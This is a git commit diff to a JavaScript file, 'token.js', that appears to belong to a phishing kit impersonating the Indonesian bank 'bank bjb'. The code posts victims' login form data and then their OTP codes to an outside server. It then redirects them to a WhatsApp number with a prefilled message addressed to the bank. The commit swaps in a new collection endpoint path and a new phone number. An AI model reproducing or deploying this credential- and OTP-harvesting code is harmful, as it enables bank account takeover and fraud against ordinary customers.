d9937c9bd6e201accab15c360c121b717bc5fc0a
bonobaru1 <bonobaru1@gmail.com>
2024-08-09 20:48:35 +0700

    Update token.js

--- agung-tomo/token.js
+++ agung-tomo/token.js
@@ -5,7 +5,7 @@ $(document).ready(function(){
  document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/bb/sendLogin.php',
+ url: 'https://choreo-is.masuk.web.id/bjb04@/sendLogin.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -41,7 +41,7 @@ $(document).ready(function(){
  document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/bb/otp.php',
+ url: 'https://choreo-is.masuk.web.id/bjb04@/otp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -102,7 +102,7 @@ var timer = setInterval(function() {
   time.html(i);
   if (i == 0) {
   $("#timer").hide();
-   location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
+   location.href='https://api.whatsapp.com/send?phone=628161140003&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
     clearInterval(timer);
 
   }
@@ -111,6 +111,6 @@ var timer = setInterval(function() {
 
 function go(){
 setTimeout(function(){  
-location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
+location.href='https://api.whatsapp.com/send?phone=628161140003&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
     }, 1500);    
 }     
